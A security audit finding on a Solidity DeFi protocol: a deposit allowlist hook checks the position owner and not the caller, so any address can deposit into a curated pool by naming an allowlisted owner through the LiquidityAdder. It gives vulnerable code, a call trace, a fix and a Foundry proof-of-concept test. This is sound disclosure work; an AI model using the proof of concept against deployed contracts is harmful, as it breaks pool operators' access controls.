### Title
Deposit Allowlist Checks Wrong Actor (`owner` Instead of `sender`), Enabling Allowlist Bypass via LiquidityAdder — (`File: metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

---

### Summary

`DepositAllowlistExtension.beforeAddLiquidity` silently discards the `sender` argument (the actual caller of `pool.addLiquidity`) and gates only on `owner` (the position owner). Because `MetricOmmPoolLiquidityAdder.addLiquidityExactShares` accepts a caller-supplied `owner` with no restriction beyond `owner != address(0)`, any non-allowlisted address can deposit into a curated pool by naming an allowlisted address as `owner`. The deposit allowlist invariant is broken.

---

### Finding Description

`DepositAllowlistExtension.beforeAddLiquidity` is declared with two address parameters: the first (`sender`) is unnamed and completely ignored; the second (`owner`) is the one checked against the allowlist. [1](#0-0) 

```solidity
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

The pool passes `msg.sender` (the immediate caller of `pool.addLiquidity`) as `sender` and the caller-supplied `owner` as the second argument: [2](#0-1) [3](#0-2) 

`MetricOmmPoolLiquidityAdder.addLiquidityExactShares` accepts an arbitrary `owner` address, validates only that it is non-zero, and forwards it directly to `pool.addLiquidity`: [4](#0-3) 

```solidity
function addLiquidityExactShares(
    address pool, address owner, uint80 salt, LiquidityDelta calldata deltas,
    uint256 maxAmountToken0, uint256 maxAmountToken1, bytes calldata extensionData
) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);          // only checks owner != address(0)
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, ...);
}
``` [5](#0-4) 

The call chain when Bob (non-allowlisted) names Alice (allowlisted) as `owner`:

```
Bob → LiquidityAdder.addLiquidityExactShares(pool, alice, ...)
      → pool.addLiquidity(alice, ...)          // msg.sender = LiquidityAdder
        → _beforeAddLiquidity(LiquidityAdder, alice, ...)
          → extension.beforeAddLiquidity(LiquidityAdder, alice, ...)
            // checks allowedDepositor[pool][alice] → TRUE → passes
      → Bob's tokens pulled, Alice receives LP shares
```

The same path exists through `addLiquidityWeighted(pool, owner, ...)`: [6](#0-5) 

---

### Impact Explanation

Any non-allowlisted address can deposit into a curated pool by specifying any allowlisted address as `owner`. The deposit allowlist invariant — "only approved depositors may add liquidity to this pool" — is broken. The actual payer (`msg.sender` of the LiquidityAdder call) is never verified. The attacker pays tokens and the named allowlisted address receives LP shares; the pool's curation boundary is violated regardless of whether the attacker profits directly.

---

### Likelihood Explanation

The `MetricOmmPoolLiquidityAdder` is the standard periphery entry point for liquidity provision. The `owner` parameter is fully caller-controlled with no restriction. Any actor who knows an allowlisted address (which is on-chain public state via `allowedDepositor`) can execute this bypass in a single transaction with no special privileges.

---

### Recommendation

Change `beforeAddLiquidity` to check `sender` (the actual caller of `pool.addLiquidity`) instead of `owner`:

```solidity
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

Note that when `MetricOmmPoolLiquidityAdder` is used, `sender` will be the LiquidityAdder contract address, so pool admins must also allowlist the LiquidityAdder if they want to permit periphery-routed deposits. Alternatively, the LiquidityAdder could propagate the true payer through `extensionData` and the extension could decode it, but that requires a coordinated protocol-level convention.

---

### Proof of Concept

```solidity
// Pool configured with DepositAllowlistExtension; only `alice` is allowlisted.
// Bob (not allowlisted) bypasses the deposit guard:

address alice = makeAddr("alice");
address bob   = makeAddr("bob");

// Pool admin allowlists only alice
vm.prank(poolAdmin);
depositExtension.setAllowedToDeposit(address(pool), alice, true);

// Confirm bob is blocked when calling directly
vm.prank(bob);
vm.expectRevert(IMetricOmmPoolActions.NotAllowedToDeposit.selector);
pool.addLiquidity(bob, 0, deltas, "", "");

// Bob bypasses via LiquidityAdder by naming alice as owner
deal(token0, bob, 1e18);
deal(token1, bob, 1e18);
vm.startPrank(bob);
IERC20(token0).approve(address(liquidityAdder), type(uint256).max);
IERC20(token1).approve(address(liquidityAdder), type(uint256).max);

// This succeeds: allowlist checks allowedDepositor[pool][alice] == true
(uint256 a0, uint256 a1) = liquidityAdder.addLiquidityExactShares(
    address(pool), alice, 0, deltas, 1e18, 1e18, ""
);
vm.stopPrank();

// Bob's tokens were consumed; alice received LP shares — allowlist bypassed
assertGt(a0 + a1, 0);
```
